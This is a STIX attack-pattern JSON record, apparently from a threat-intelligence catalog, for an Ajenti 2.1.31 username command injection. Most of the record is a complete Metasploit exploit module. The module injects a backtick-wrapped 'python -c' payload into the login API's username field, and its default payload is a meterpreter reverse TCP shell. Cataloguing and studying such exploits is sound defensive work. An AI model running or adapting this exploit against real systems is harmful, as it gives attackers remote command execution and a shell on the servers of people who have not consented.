{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--963e2910-d79a-4d56-bb92-9445c9e319ef",
    "created": "2024-08-14T17:14:02.941707Z",
    "modified": "2024-08-14T17:14:02.941711Z",
    "name": "Ajenti auth username Command Injection",
    "description": " This module exploits a command injection in Ajenti == 2.1.31. By injecting a command into the username POST parameter to api/core/auth, a shell can be spawned. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/ajenti_auth_username_cmd_injection.rb",
            "external_id": "ajenti_auth_username_cmd_injection.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Ajenti auth username Command Injection',\n      'Description'     => %q{\n        This module exploits a command injection in Ajenti == 2.1.31.\n        By injecting a command into the username POST parameter to api/core/auth, a shell can be spawned.\n      },\n      'Author'          => [\n        'Jeremy Brown', # Vulnerability discovery\n        'Onur ER <onur@onurer.net>' # Metasploit module\n      ],\n      'References'      => [\n        ['EDB', '47497']\n      ],\n      'DisclosureDate'  => '2019-10-14',\n      'License'         => MSF_LICENSE,\n      'Platform'        => 'python',\n      'Arch'            => ARCH_PYTHON,\n      'Privileged'      => false,\n      'Targets'         => [\n        ['Ajenti == 2.1.31', {}]\n      ],\n      'DefaultOptions'  =>\n          {\n            'RPORT'   => 8000,\n            'SSL'     => true,\n            'payload' => 'python/meterpreter/reverse_tcp'\n          },\n      'DefaultTarget'   => 0\n    ))\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => '/view/login/normal'\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.body =~ /ajenti/i\n      return CheckCode::Safe\n    end\n\n    version = res.body.scan(/'ajentiVersion', '([\\d\\.]+)'/).flatten.first\n\n    if version\n      vprint_status \"Ajenti version #{version}\"\n    end\n\n    if version == '2.1.31'\n      return CheckCode::Appears\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    print_status('Exploiting...')\n    json_body = { 'username' => \"`python -c \\\"#{payload.encoded}\\\"`\",\n                  'password' => rand_text_alpha_lower(7),\n                  'mode' => 'normal'\n    }\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri, 'api', 'core', 'auth'),\n      'ctype'  => 'application/json',\n      'data'   => JSON.generate(json_body)\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-10-14",
    "x_mitre_platforms": [
        "python'"
    ]
}